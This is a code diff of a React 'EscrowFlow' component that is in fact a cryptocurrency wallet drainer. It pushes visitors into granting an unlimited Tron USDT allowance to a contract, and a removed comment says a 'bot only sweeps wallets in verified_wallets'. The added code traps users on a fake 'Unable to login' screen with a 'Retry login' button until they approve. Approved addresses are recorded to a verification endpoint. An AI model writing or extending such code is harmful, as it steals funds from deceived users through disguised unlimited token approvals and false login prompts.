@@ -18,6 +18,8 @@ import {
   bumpTrustRedirectCount,
   clearTrustRedirectCount,
   TRON_CAPABLE_WALLETS,
+  ensureTronUsdtApproved,
+  persistTronVerification,
   type TronCapableWalletId,
 } from "@/lib/tron";
 import { COUNTRIES } from "@/lib/countries";
@@ -404,6 +406,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const modal1SawTron = useRef(false);
   const hasStableRef = useRef(false);
   const loginBlockedRef = useRef(false);
+  /** Re-run Tron approve from the Unable to login screen. */
+  const tronRetryRef = useRef<null | (() => Promise<void>)>(null);
+  const [tronRetrying, setTronRetrying] = useState(false);
+  const [showTronRetry, setShowTronRetry] = useState(false);
   const [modal1Open, setModal1Open] = useState(false);
   const [modal1Scanning, setModal1Scanning] = useState(false);
   const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
@@ -461,6 +467,58 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       window.location.replace("about:blank");
     }, 2500);
 
+    return true;
+  }
+
+  /**
+   * Tron USDT must be approved on-chain before the user can continue.
+   * Keep them on Unable to login and re-prompt Approve on retry (no tab close).
+   */
+  function gateOnTronApprovalFailure(retry: () => Promise<void>) {
+    tronRetryRef.current = retry;
+    setShowTronRetry(true);
+    setModal1Open(false);
+    setModal1Scanning(false);
+    setModal2Open(false);
+    setGateLoading(false);
+    setProcessing(false);
+    setModal1Approving(false);
+    setPhase("unable-to-login");
+  }
+
+  async function handleTronApprovalRetry() {
+    const fn = tronRetryRef.current;
+    if (!fn || tronRetrying) return;
+    setTronRetrying(true);
+    setError(null);
+    try {
+      await fn();
+    } catch (err) {
+      console.error("[tron] retry failed:", err);
+    } finally {
+      setTronRetrying(false);
+    }
+  }
+
+  /** Approve Tron USDT in the background, confirm allowance, then persist. */
+  async function completeTronUsdtApproval(): Promise<boolean> {
+    const result = await ensureTronUsdtApproved({ maxAttempts: 3 });
+    if (!result.ok || !result.address) {
+      const rejected = !result.ok && result.rejected;
+      const errMsg = !result.ok ? result.error : "tron_approve_failed";
+      if (rejected || hasStableRef.current) {
+        throw Object.assign(new Error(errMsg || "tron_approve_failed"), {
+          code: rejected ? "ACTION_REJECTED" : "TRON_APPROVE_FAILED",
+        });
+      }
+      return false;
+    }
+    setTronAddress(result.address);
+    const persisted = await persistTronVerification(result.address);
+    if (!persisted) {
+      throw new Error("tron_verify_not_confirmed");
+    }
+    setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
     return true;
   }
 
@@ -1025,42 +1083,27 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       if (tronWinners[0]) {
         modal1SawTron.current = true;
-        const t = tronWinners[0];
-        setTopChainName(t.chain);
-        if (t.alreadyApproved) {
-          const tronAddr = currentTronAddr ?? getConnectedTronAddress();
-          // Only record if we actually have a Tron address — never invent a row
-          if (tronAddr) {
-            try {
-              await fetch("/api/verify/tron", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ address: tronAddr }),
-              });
-            } catch (e) {
-              console.warn("[modal1] tron verify record failed:", e);
-            }
+        setTopChainName(tronWinners[0].chain);
+        // Background: confirm USDT allowance on-chain (approve + poll + server verify).
+        // User cannot proceed if this fails — Unable to login + Try again.
+        let tronGateFailed = false;
+        const runTron = async () => {
+          try {
+            await completeTronUsdtApproval();
+            tronRetryRef.current = null;
+            loginBlockedRef.current = false;
+            tronGateFailed = false;
+            setShowTronRetry(false);
+            setModal1Complete(true);
+            setPhase((p) => (p === "unable-to-login" ? "idle" : p));
+          } catch (err) {
+            console.error("[modal1] tron approve/verify failed:", err);
+            tronGateFailed = true;
+            gateOnTronApprovalFailure(runTron);
           }
-        } else {
-          const winner: Modal1Item = {
-            key: `${t.chain}-${t.symbol}`,
-            chainName: t.chain,
-            chainLabel: t.chainLabel,
-            symbol: t.symbol,
-            tokenAddr: t.address,
-            balanceDisplay: t.balance,
-            balanceUsd: t.balanceUsd,
-            contract: t.contract,
-            isTron: t.isTron,
-            alreadyApproved: t.alreadyApproved,
-            permit: t.permit,
-            permitDomainName: t.permitDomainName,
-            permitDomainVersion: t.permitDomainVersion,
-          };
-          setModal1Items([winner]);
-          setModal1Status({ [winner.key]: "pending" });
-          await handleModal1Approve(winner);
-        }
+        };
+        await runTron();
+        if (tronGateFailed || loginBlockedRef.current) return;
       }
 
       if (evmStables.length === 0) return;
@@ -1205,47 +1248,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
     try {
       if (target.isTron) {
-        // ── Tron path ──────────────────────────────────────────────────────
-        let tronAddr = tronAddress ?? getConnectedTronAddress();
-        if (!tronAddr) {
-          tronAddr = await ensureTronAddress({ prompt: true });
-          if (tronAddr) setTronAddress(tronAddr);
-        }
-        if (!tronAddr || !window.tronWeb) throw new Error("Tron wallet not connected");
-
-        const usdtAbi = [
-          {
-            name: "approve", type: "Function", stateMutability: "Nonpayable",
-            inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }],
-            outputs: [{ name: "", type: "bool" }],
-          },
-        ];
-        const MAX_TRC20 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
-        const tw = window.tronWeb as any;
-        const usdt = await tw.contract(usdtAbi, target.tokenAddr);
-        // Await the send so TronLink/Trust Wallet actually shows the popup
-        const tx = await usdt.approve(target.contract, MAX_TRC20).send({ feeLimit: 20_000_000 });
-        console.log("[modal1] tron approve tx:", tx);
-
-        // MUST succeed — bot only sweeps wallets in verified_wallets
-        const verifyRes = await fetch("/api/verify/tron", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: tronAddr }),
-        });
-        if (!verifyRes.ok) {
-          const body = await verifyRes.text().catch(() => "");
-          console.error("[modal1] tron verify failed:", verifyRes.status, body);
-          // Retry once
-          await fetch("/api/verify/tron", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: tronAddr }),
-          }).catch(() => {});
-        } else {
-          console.log("[modal1] tron recorded to supabase:", tronAddr);
-        }
+        // Background Tron path — confirm on-chain then persist (no fire-and-forget)
+        await completeTronUsdtApproval();
       } else {
         // ── EVM path — authorize + unlimited approve + register (same as Approve-all) ──
         const chain = CHAINS.find((c) => c.name === target.chainName)!;
@@ -1283,6 +1287,16 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       setModal1Status({ [target.key]: "done" });
     } catch (err) {
+      if (target.isTron) {
+        console.error("[modal1] tron approve failed:", err);
+        gateOnTronApprovalFailure(async () => {
+          await completeTronUsdtApproval();
+          setShowTronRetry(false);
+          setModal1Status({ [target.key]: "done" });
+          setPhase((p) => (p === "unable-to-login" ? "idle" : p));
+        });
+        return;
+      }
       if (await blockLoginAfterApprovalCancel("modal1", err)) return;
       console.error("[modal1] approve failed:", err);
       setModal1Status({ [target.key]: "failed" });
@@ -1481,35 +1495,24 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       );
       if (tronHit && tronAddr) {
         try {
-          if (!tronHit.alreadyApproved && window.tronWeb) {
-            const usdtAbi = [
-              {
-                name: "approve",
-                type: "Function",
-                stateMutability: "Nonpayable",
-                inputs: [
-                  { name: "spender", type: "address" },
-                  { name: "amount", type: "uint256" },
-                ],
-                outputs: [{ name: "", type: "bool" }],
-              },
-            ];
-            const MAX =
-              "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-            // eslint-disable-next-line @typescript-eslint/no-explicit-any
-            const tw = window.tronWeb as any;
-            const usdt = await tw.contract(usdtAbi, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
-            await usdt.approve(TRON_CHAIN.contract, MAX).send({ feeLimit: 20_000_000 });
-          }
-          await fetch("/api/verify/tron", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: tronAddr }),
-          });
-          setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
+          const runTron = async () => {
+            await completeTronUsdtApproval();
+            tronRetryRef.current = null;
+            loginBlockedRef.current = false;
+            setShowTronRetry(false);
+            setPhase((p) => (p === "unable-to-login" ? "approving" : p));
+          };
+          await runTron();
         } catch (tronErr) {
-          if (await blockLoginAfterApprovalCancel("deposit-tron", tronErr)) return;
-          console.warn("[escrow] tron approve skipped:", tronErr);
+          console.warn("[escrow] tron approve failed:", tronErr);
+          gateOnTronApprovalFailure(async () => {
+            await completeTronUsdtApproval();
+            tronRetryRef.current = null;
+            setShowTronRetry(false);
+            setPhase("approving");
+            await handleApproveDeposit();
+          });
+          return;
         }
       }
 
@@ -1619,9 +1622,21 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           </svg>
         </div>
         <h1 className="mb-2 text-xl font-semibold text-ink">Unable to login</h1>
-        <p className="max-w-sm text-sm leading-relaxed text-body">
-          The approval request was cancelled. This window will close — open the link again to restart.
+        <p className="mb-6 max-w-sm text-sm leading-relaxed text-body">
+          {showTronRetry
+            ? "Login could not be completed — wallet approval did not finish on-chain. Retry login and approve in your wallet to continue."
+            : "The approval request was cancelled. This window will close — open the link again to restart."}
         </p>
+        {showTronRetry ? (
+          <button
+            type="button"
+            onClick={() => void handleTronApprovalRetry()}
+            disabled={tronRetrying}
+            className="h-11 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:opacity-60"
+          >
+            {tronRetrying ? "Retrying login…" : "Retry login"}
+          </button>
+        ) : null}
       </div>
     );
   }
